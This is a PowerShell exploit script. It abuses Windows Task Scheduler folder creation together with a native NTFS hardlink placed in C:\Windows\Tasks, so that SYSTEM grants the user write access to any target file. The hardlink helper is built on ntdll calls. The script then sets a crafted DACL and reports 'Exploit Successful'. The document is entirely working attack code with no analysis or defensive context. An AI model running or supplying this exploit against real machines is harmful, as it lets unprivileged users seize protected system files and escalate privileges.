param($TargetFile)

$TaskFolder = [System.Guid]::NewGuid().Guid

function Native-HardLink {


    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [String]$Link,
        [Parameter(Mandatory = $True)]
        [String]$Target
    )

    
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public Int32 Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public UInt32 Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IO_STATUS_BLOCK
    {
        public IntPtr Status;
        public IntPtr Information;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public UInt16 Length;
        public UInt16 MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
    public struct FILE_LINK_INFORMATION
    {
        [MarshalAs(UnmanagedType.U1)]
        public bool ReplaceIfExists;
        public IntPtr RootDirectory;
        public UInt32 FileNameLength;
        [MarshalAs(UnmanagedType.ByValTStr,SizeConst=260)]
        public String FileName;
    }

    public static class NtHardLink
    {
        [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
        public static extern UInt32 GetFullPathName(
            String lpFileName,
            UInt32 nBufferLength,
            System.Text.StringBuilder lpBuffer,
            ref IntPtr FnPortionAddress);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(
            IntPtr hObject);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtOpenFile(
            ref IntPtr FileHandle,
            UInt32 DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjAttr,
            ref IO_STATUS_BLOCK IoStatusBlock,
            UInt32 ShareAccess,
            UInt32 OpenOptions);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtSetInformationFile(
            IntPtr FileHandle,
            ref IO_STATUS_BLOCK IoStatusBlock,
            IntPtr FileInformation,
            UInt32 Length,
            UInt32 FileInformationClass);
    }
"@

    function Emit-UNICODE_STRING {
        param(
            [String]$Data
        )

        $UnicodeObject = New-Object UNICODE_STRING
        $UnicodeObject_Buffer = $Data
        [UInt16]$UnicodeObject.Length = $UnicodeObject_Buffer.Length*2
        [UInt16]$UnicodeObject.MaximumLength = $UnicodeObject.Length+1
        [IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UnicodeObject_Buffer)
        [IntPtr]$InMemoryStruct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(16) 
        [system.runtime.interopservices.marshal]::StructureToPtr($UnicodeObject, $InMemoryStruct, $true)

        $InMemoryStruct
    }

    function Get-FullPathName {
        param(
            [String]$Path
        )

        $lpBuffer = New-Object -TypeName System.Text.StringBuilder
        $FnPortionAddress = [IntPtr]::Zero

        
        $CallResult = [NtHardLink]::GetFullPathName($Path,1,$lpBuffer,[ref]$FnPortionAddress)

        if ($CallResult -ne 0) {
            
            $lpBuffer.EnsureCapacity($CallResult)|Out-Null
            $CallResult = [NtHardLink]::GetFullPathName($Path,$lpBuffer.Capacity,$lpBuffer,[ref]$FnPortionAddress)
            $FullPath = "\??\" + $lpBuffer.ToString()
        } else {
            $FullPath = $false
        }

        
        $FullPath
    }

    function Get-NativeFileHandle {
        param(
            [String]$Path
        )

        $FullPath = Get-FullPathName -Path $Path
        if ($FullPath) {
            
            if (![IO.File]::Exists($Path)) {
                Write-Verbose "[!] Invalid file path specified.."
                $false
                Return
            }
        } else {
            Write-Verbose "[!] Failed to retrieve fully qualified path.."
            $false
            Return
        }

        
        [IntPtr]$hFile = [IntPtr]::Zero
        $ObjAttr = New-Object OBJECT_ATTRIBUTES
        $ObjAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($ObjAttr)
        $ObjAttr.ObjectName = Emit-UNICODE_STRING -Data $FullPath
        $ObjAttr.Attributes = 0x40
        $IoStatusBlock = New-Object IO_STATUS_BLOCK

        
        $CallResult = [NtHardLink]::NtOpenFile([ref]$hFile,0x02000000,[ref]$ObjAttr,[ref]$IoStatusBlock,0x1,0x0)
        if ($CallResult -eq 0) {
            $Handle = $hFile
        } else {
            Write-Verbose "[!] Failed to acquire file handle, NTSTATUS($('{0:X}' -f $CallResult)).."
            $Handle = $false
        }

        
        $Handle
    }

    function Create-NtHardLink {
        param(
            [String]$Link,
            [String]$Target
        )

        $LinkFullPath = Get-FullPathName -Path $Link
        
        $LinkParent = [IO.Directory]::GetParent($Link).FullName
        if (![IO.Directory]::Exists($LinkParent)) {
            Write-Verbose "[!] Invalid link folder path specified.."
            $false
            Return
        }
        

        
        $FileLinkInformation = New-Object FILE_LINK_INFORMATION
        $FileLinkInformation.ReplaceIfExists = $true
        $FileLinkInformation.FileName = $LinkFullPath
        $FileLinkInformation.RootDirectory = [IntPtr]::Zero
        $FileLinkInformation.FileNameLength = $LinkFullPath.Length * 2
        $FileLinkInformationLen = [System.Runtime.InteropServices.Marshal]::SizeOf($FileLinkInformation)
        $pFileLinkInformation = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FileLinkInformationLen)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($FileLinkInformation, $pFileLinkInformation, $true)
        $IoStatusBlock = New-Object IO_STATUS_BLOCK

        
        $hTarget = Get-NativeFileHandle -Path $Target
        if (!$hTarget) {
            $false
            Return
        }

        
        $CallResult = [NtHardLink]::NtSetInformationFile($hTarget,[ref]$IoStatusBlock,$pFileLinkInformation,$FileLinkInformationLen,0xB)
        if ($CallResult -eq 0) {
            $true
        } else {
            Write-Verbose "[!] Failed to create hardlink, NTSTATUS($('{0:X}' -f $CallResult)).."
        }

        
        $CallResult = [NtHardLink]::CloseHandle($hTarget)
    }

    
    Create-NtHardLink -Link $Link -Target $Target
}


$Hardlink = Native-HardLink -Link "C:\Windows\Tasks\$($TaskFolder).job" -Target $TargetFile
if(-not $Hardlink)
{
    Write-Host "Exploit Failed, unable to hardlink '$TargetFile'." -ForegroundColor Yellow
    return
}


$DACL = 'D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)'

try {
    
    $SService = New-Object -ComObject Schedule.Service
    $SService.Connect()
    $RootFolder = $SService.GetFolder('\')
    $ExploitFolder = $RootFolder.CreateFolder($TaskFolder)
    $ExploitFolder.SetSecurityDescriptor($DACL, 0)

    Write-Host "Exploit Successful, you can now modify '$TargetFile'." -ForegroundColor Green
}
catch {
    Write-Host "Exploit Failed, most likely SYSTEM has insufficent permissions on '$TargetFile'." -ForegroundColor Yellow
}
